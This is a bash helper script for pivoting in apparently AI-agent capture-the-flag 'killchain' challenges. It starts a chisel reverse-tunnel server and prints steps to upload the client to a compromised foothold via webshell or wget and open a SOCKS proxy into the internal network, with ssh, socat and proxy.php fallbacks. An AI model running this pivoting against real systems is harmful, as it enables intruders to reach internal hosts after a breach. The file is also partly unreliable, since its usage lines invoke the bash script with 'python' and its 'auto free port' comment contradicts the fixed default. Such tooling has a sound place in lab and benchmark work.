#!/usr/bin/env bash
# Reverse-tunnel pivot helper for killchain (b-*) challenges.
#
# Situation: you have RCE on a foothold inside the challenge's internal docker
# net, but other internal containers are only reachable FROM the foothold. Use
# chisel to pull that internal net back to your sandbox over SOCKS.
#
# This script runs on YOUR SANDBOX (the agent host). It:
#   1. starts a chisel reverse-tunnel SERVER on a free port
#   2. prints the exact chisel CLIENT one-liner to run on the foothold
#   3. after the foothold connects, you reach internal hosts via SOCKS:
#        curl --socks5-hostname 127.0.0.1:1080 http://172.20.0.3/
#        ncat --proxy 127.0.0.1:1080 --proxy-type socks5 172.20.0.4 22
#
# Usage:  python ../../scripts/pivot.sh                 # auto free port
#         PORT=34571 python ../../scripts/pivot.sh       # fixed port
set -u
CHISEL="$(command -v chisel || echo /usr/local/bin/chisel)"
if [ ! -x "$CHISEL" ]; then
  echo "[!] chisel not found at $CHISEL — install it (Dockerfile does) or"
  echo "    fall back to ssh -D / socat / upload a static proxy.php."
  exit 1
fi
PORT="${PORT:-34571}"
# pick the sandbox IP the foothold can route back to. hostname -I lists them;
# the benchmark net is usually 10.0.x.x — the foothold reaches that one.
IPS="$(hostname -I 2>/dev/null | tr ' ' '\n' | grep -E '^[0-9]+\.' | head -5)"

echo "=== starting chisel reverse server on :$PORT (logs: /tmp/chisel_srv.log) ==="
nohup "$CHISEL" server --reverse --port "$PORT" >/tmp/chisel_srv.log 2>&1 &
echo "    server pid $!  (tail -f /tmp/chisel_srv.log to watch the foothold connect)"
echo
echo "=== STEP 1 — get the chisel CLIENT onto the foothold (via your webshell/upload): ==="
echo "    the amd64 linux client is the SAME binary: $CHISEL"
echo "    upload it to the foothold (e.g. base64-pipe through the RCE, or wget from"
echo "    a python http.server you start here)."
echo
echo "=== STEP 2 — run this ON THE FOOTHOLD (pick the IP it can reach, one of): ==="
echo "$IPS" | sed 's/^/    /'
echo
echo "    ./chisel client <SANDBOX_IP>:$PORT R:1080:socks"
echo "    # (add more reverse forwards if you prefer ports to SOCKS:"
echo "    #  R:2222:172.20.0.4:22 R:2121:172.20.0.4:21 R:1080:socks)"
echo
echo "=== STEP 3 — once the foothold connects, from THIS sandbox reach internal hosts: ==="
echo "    curl --socks5-hostname 127.0.0.1:1080 http://172.20.0.3/"
echo "    ncat --proxy 127.0.0.1:1080 --proxy-type socks5 172.20.0.4 22"
echo "    # proxychains: set 'socks5 127.0.0.1 1080' in /etc/proxychains4.conf"
echo
echo "[i] containers may flap (brief ~10s open windows) — poll the port in a"
echo "    tight loop and fire the exploit the instant it's up."
